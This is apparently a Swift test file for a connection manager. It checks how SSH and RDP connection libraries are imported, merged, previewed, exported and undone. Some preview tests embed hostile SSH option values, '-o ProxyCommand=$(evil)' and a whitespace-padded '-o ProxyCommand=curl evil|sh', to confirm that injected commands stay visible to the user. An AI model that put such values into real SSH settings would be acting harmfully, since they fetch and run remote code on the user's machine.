import Foundation
import Testing
@testable import xpnd

private func conn(_ name: String, host: String = "h", act: String? = nil, jump: JumpHost? = nil, id: UUID = UUID()) -> Connection {
    Connection(id: id, name: name, host: host, activation: act, jumpHost: jump)
}

struct ConnectionImportTests {
    @Test func mergeByFolderName() {
        let existing = ConnectionLibrary(folders: [ConnectionFolder(
            name: "prod", connections: [conn("a")], folders: [ConnectionFolder(name: "db", connections: [conn("d1")])])])
        let incoming = ConnectionLibrary(folders: [
            ConnectionFolder(name: "prod", connections: [conn("b")],
                             folders: [ConnectionFolder(name: "db", connections: [conn("d2")])]),
            ConnectionFolder(name: "new", connections: [conn("n")])])
        let r = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        #expect(r.folders.map(\.name) == ["prod", "new"])
        #expect(r.folders[0].connections.map(\.name) == ["a", "b"])
        #expect(r.folders[0].folders.count == 1)
        #expect(r.folders[0].folders[0].connections.map(\.name) == ["d1", "d2"])
    }

    @Test func skipReplaceOnActivationConflict() {
        let old = conn("old", act: ";x")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old])])
        let incoming = ConnectionLibrary(folders: [
            ConnectionFolder(name: "b", activation: ";f", connections: [conn("new", act: ";x")])])
        #expect(ConnectionImport.conflicts(incoming: incoming, existing: existing) == [";x"])

        let skipped = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        #expect(skipped.allConnections.map(\.name) == ["old"])
        #expect(skipped.folders.map(\.name) == ["a", "b"])

        let replaced = ConnectionImport.merge(incoming, into: existing, choice: .replace)
        #expect(replaced.folders[0].connections.isEmpty)
        #expect(replaced.folders[1].connections.map(\.name) == ["new"])

        // A conflicting folder string is cleared to nil under skip.
        let existingF = ConnectionLibrary(folders: [ConnectionFolder(name: "z", activation: ";f")])
        let s = ConnectionImport.merge(incoming, into: existingF, choice: .skip)
        #expect(s.folders[1].activation == nil)
        let r = ConnectionImport.merge(incoming, into: existingF, choice: .replace)
        #expect(r.folders[1].activation == ";f")
        #expect(r.folders[0].activation == "")
    }

    /// A full export carries the global and folder credentials its connections inherit.
    @Test func importedConnectionsKeepTheCredentialsTheirFileGaveThem() {
        func ref(_ item: String) -> CredentialRef {
            CredentialRef(account: "a", vault: "v", item: item, title: item, category: .login)
        }
        let incoming = ConnectionLibrary(credential: ref("file-global"), folders: [
            ConnectionFolder(name: "prod", credential: ref("file-prod"), connections: [conn("p")]),
            ConnectionFolder(name: "web", connections: [conn("w")]),
        ])
        // Nothing here at either level: the file's fill them, and nothing needs pinning.
        let empty = ConnectionLibrary(folders: [ConnectionFolder(name: "prod")])
        let filled = ConnectionImport.merge(incoming, into: empty, choice: .skip)
        #expect(filled.credential == ref("file-global"))
        #expect(filled.folders[0].credential == ref("file-prod"))
        #expect(filled.allConnections.allSatisfy { $0.credential == nil })

        // Different ones here: each imported connection keeps the file's, and this Mac's stay as they were.
        let mine = ConnectionLibrary(credential: ref("mine"), folders: [
            ConnectionFolder(name: "prod", credential: ref("my-prod"), connections: [conn("mp")])])
        let r = ConnectionImport.merge(incoming, into: mine, choice: .skip)
        let p = r.allConnections.first { $0.name == "p" }!
        let w = r.allConnections.first { $0.name == "w" }!
        let mp = r.allConnections.first { $0.name == "mp" }!
        #expect(r.loginCredential(for: p.id)?.ref == ref("file-prod"))
        #expect(r.loginCredential(for: w.id)?.ref == ref("file-global"))
        #expect(r.loginCredential(for: mp.id)?.ref == ref("my-prod"))
        #expect(r.credential == ref("mine"))
    }

    /// A string a snippet already uses would leave both doing nothing; the item still comes in, without it.
    @Test func stringsSnippetsUseAreTakenOff() {
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "f", activation: ";s", connections: [conn("c", act: ";sig"), conn("d", act: ";d")])])
        let (kept, taken) = ConnectionImport.removing([";sig", ";s"], from: incoming)
        #expect(taken == [";s", ";sig"])
        #expect(kept.folders[0].activation == nil)
        #expect(kept.folders[0].connections.map(\.activation) == [nil, ";d"])
    }

    @Test func idsKeptUnlessColliding() {
        let shared = conn("shared")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [shared])])
        let keep = conn("keep")
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [
            conn("shared2", id: shared.id), conn("viaJump", jump: .connection(shared.id)), keep])])
        let r = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        let b = r.folders[1].connections
        #expect(b[0].id != shared.id)
        #expect(b[1].jumpHost == .connection(b[0].id))
        #expect(b[2].id == keep.id)
        #expect(Set(r.allConnections.map(\.id)).count == 4)
    }

    /// The addresses of what a merge adds, as the preview lists them.
    private func hostsAdded(_ incoming: ConnectionLibrary, _ existing: ConnectionLibrary, _ choice: ConflictChoice) -> [String] {
        Set(ConnectionImport.preview(incoming: incoming, existing: existing, choice: choice).added.map(\.address)).sorted()
    }

    @Test func thePreviewListsOnlyWhatTheMergeAdds() {
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [conn("x", host: "old")])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("1", host: "zeta"), conn("2", host: "alpha"), conn("3", host: "alpha")])])
        #expect(hostsAdded(incoming, existing, .replace) == ["alpha:22", "zeta:22"])
        let clash = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("x", host: "old", act: ";k")])])
        let inc2 = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("1", host: "skipped", act: ";k"), conn("2", host: "kept")])])
        #expect(hostsAdded(inc2, clash, .skip) == ["kept:22"])
        #expect(hostsAdded(inc2, clash, .replace) == ["kept:22", "skipped:22"])
    }

    @Test func previewRowsShowWhatRunsOnConnect() {
        let bastion = conn("bastion", host: "b.example")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [bastion, conn("x", act: ";k")])])
        var web = conn("web", host: "web.example", jump: .connection(bastion.id))
        web.username = "deploy"
        web.port = 2222
        web.sshOptions = "-o ProxyCommand=$(evil)"
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [
            web, conn("v6", host: "::1", jump: .text("ec2-user@jump:22")), conn("gone", jump: .connection(UUID())),
            conn("clash", act: ";k")])])
        let rows = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .skip).added
        #expect(rows.map(\.name) == ["web", "v6", "gone"])
        #expect(rows[0].address == "deploy@web.example:2222")
        #expect(rows[0].jumpHost == "bastion")
        #expect(rows[0].sshOptions == "-o ProxyCommand=$(evil)")
        #expect(rows[1].address == "[::1]:22")
        #expect(rows[1].jumpHost == "ec2-user@jump:22")
        #expect(rows[2].jumpHost == "A missing connection")
        #expect(ConnectionImport.preview(incoming: incoming, existing: existing, choice: .replace).added.map(\.name)
            == ["web", "v6", "gone", "clash"])
    }

    /// Replace changes existing connections too, so the preview names them.
    @Test func previewShowsRemovedAndRepointedExisting() {
        let old = conn("old", act: ";x"), user = conn("user", jump: .connection(old.id)), plain = conn("plain", jump: .text("j"))
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old, user, plain])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [conn("new", act: ";x")])])

        let replaced = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .replace)
        #expect(replaced.added.map(\.name) == ["new"])
        #expect(replaced.removed == ["old"])
        #expect(replaced.rejumped == [ConnectionImport.Rejump(name: "user", jumpHost: "new")])

        let skipped = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .skip)
        #expect(skipped.added.isEmpty)
        #expect(skipped.removed.isEmpty)
        #expect(skipped.rejumped.isEmpty)
    }

    /// A folder's string evicts an existing connection too, so the sheet must list Removed with nothing added.
    @Test func folderOnlyReplaceStillRemoves() {
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [conn("old", act: ";x")])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", activation: ";x")])
        let preview = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .replace)
        #expect(preview.added.isEmpty)
        #expect(preview.removed == ["old"])
    }

    @Test func previewShowsHiddenCharacters() {
        #expect(ConnectionImport.visible("-o A=1\n-o ProxyCommand=x") == "-o A=1⏎-o ProxyCommand=x")
        #expect(ConnectionImport.visible("a\tb\u{1B}[2Kc\r\u{7F}") == "a⇥b␛[2Kc␍␡")
        #expect(ConnectionImport.visible("x\u{202E}y\u{85}") == "x<U+202E>y<U+85>")
        let long = "-o ServerAliveInterval=30" + String(repeating: " ", count: 300) + "-o ProxyCommand=curl evil|sh"
        #expect(ConnectionImport.visible(long) == long)
        #expect(ConnectionImport.visible("prod 🚀 é") == "prod 🚀 é")
    }

    @Test func exportSelectedFoldersRoundTrips() throws {
        let inner = ConnectionFolder(name: "inner", connections: [conn("i", jump: .text("j"))])
        let a = ConnectionFolder(name: "a", activation: ";a", connections: [conn("c")], folders: [inner])
        let b = ConnectionFolder(name: "b", connections: [conn("d")])
        let lib = ConnectionLibrary(folders: [a, b])
        let one = try ConnectionYAML.decode(ConnectionImport.export(lib, folders: [a.id]))
        #expect(one.folders == [a])
        let nested = try ConnectionYAML.decode(ConnectionImport.export(lib, folders: [inner.id]))
        #expect(nested.folders == [inner])
        #expect(try ConnectionYAML.decode(ConnectionImport.export(lib, folders: nil)) == lib)
    }

    @Test func jumpsRepointedAfterRemoval() {
        // Replace: existing connection evicted; an existing jump to it follows the replacement.
        let old = conn("old", act: ";x")
        let user = conn("user", jump: .connection(old.id))
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old, user])])
        let new = conn("new", act: ";x")
        let r = ConnectionImport.merge(ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [new])]),
                                       into: existing, choice: .replace)
        #expect(r.connection(user.id)?.jumpHost == .connection(new.id))

        // Skip: dropped incoming connection; incoming jumps to it follow the kept existing one.
        let dropped = conn("dropped", act: ";x")
        let via = conn("via", jump: .connection(dropped.id))
        let s = ConnectionImport.merge(
            ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [dropped, via])]),
            into: existing, choice: .skip)
        #expect(s.connection(via.id)?.jumpHost == .connection(old.id))
    }

    @Test func mergedFolderActivation() {
        let victim = conn("v", act: ";f")
        func lib(_ folderAct: String?) -> ConnectionLibrary {
            ConnectionLibrary(folders: [ConnectionFolder(name: "a", activation: folderAct), ConnectionFolder(name: "o", connections: [victim])])
        }
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "a", activation: ";f")])
        // No conflict with the folder itself having none: adopted.
        let free = ConnectionImport.merge(incoming, into: ConnectionLibrary(folders: [ConnectionFolder(name: "a")]), choice: .skip)
        #expect(free.folders[0].activation == ";f")
        // Conflict with another owner.
        let skipped = ConnectionImport.merge(incoming, into: lib(nil), choice: .skip)
        #expect(skipped.folders[0].activation == nil)
        #expect(skipped.folders[1].connections.count == 1)
        let replaced = ConnectionImport.merge(incoming, into: lib(nil), choice: .replace)
        #expect(replaced.folders[0].activation == ";f")
        #expect(replaced.folders[1].connections.isEmpty)
    }
}

struct ConnectionImportRDPTests {
    @Test func importPreviewShowsRDPAddressAndGateway() {
        let c = Connection(name: "w", type: .rdp, host: "win", username: "me", domain: "CORP",
                           rdp: RDPOptions(gateway: .init(host: "gw")))
        let p = ConnectionImport.preview(incoming: ConnectionLibrary(folders: [ConnectionFolder(name: "f", connections: [c])]),
                                         existing: .empty, choice: .skip)
        #expect(p.added.first?.address == "CORP\\me@win:3389")
        #expect(p.added.first?.gateway == "gw")
    }

    // MARK: Undoing an import

    @Test func undoImportRemovesAddedAndRestoresReplaced() {
        let old = conn("old", act: ";x"), keep = conn("keep")
        let before = ConnectionLibrary(folders: [ConnectionFolder(name: "prod", connections: [old, keep])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "prod", connections: [conn("new", act: ";x")]),
                                                   ConnectionFolder(name: "extra", connections: [conn("n")])])
        let after = ConnectionImport.merge(incoming, into: before, choice: .replace)
        #expect(after.connection(old.id) == nil)
        let undone = ConnectionImport.undo(before: before, after: after, in: after)
        #expect(undone == before)
    }

    @Test func undoImportKeepsAnEditedImport() throws {
        let before = ConnectionLibrary(folders: [ConnectionFolder(name: "prod", connections: [conn("a")])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "prod", connections: [conn("b"), conn("c")])])
        let after = ConnectionImport.merge(incoming, into: before, choice: .skip)
        var current = after
        let b = try #require(current.allConnections.first { $0.name == "b" })
        current.editConnection(b.id) { $0.host = "edited" }
        let undone = ConnectionImport.undo(before: before, after: after, in: current)
        #expect(undone.allConnections.map(\.name) == ["a", "b"])
        #expect(undone.connection(b.id)?.host == "edited")
    }

    @Test func undoImportRevertsAFolderStringItTook() {
        let before = ConnectionLibrary(folders: [ConnectionFolder(name: "prod", activation: ";p")])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "other", connections: [conn("c", act: ";p")])])
        let after = ConnectionImport.merge(incoming, into: before, choice: .replace)
        #expect(after.folders[0].activation != ";p")
        #expect(ConnectionImport.undo(before: before, after: after, in: after) == before)
    }

    @Test func undoImportRemovesAddedFoldersOnlyIfEmpty() throws {
        let before = ConnectionLibrary(folders: [ConnectionFolder(name: "prod")])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "new", connections: [conn("n")])])
        let after = ConnectionImport.merge(incoming, into: before, choice: .skip)
        var current = after
        let new = try #require(current.folders.last)
        current.editFolder(new.id) { $0.connections.append(conn("mine")) }
        let undone = ConnectionImport.undo(before: before, after: after, in: current)
        #expect(undone.folders.map(\.name) == ["prod", "new"])
        #expect(undone.folders[1].connections.map(\.name) == ["mine"])
    }
}
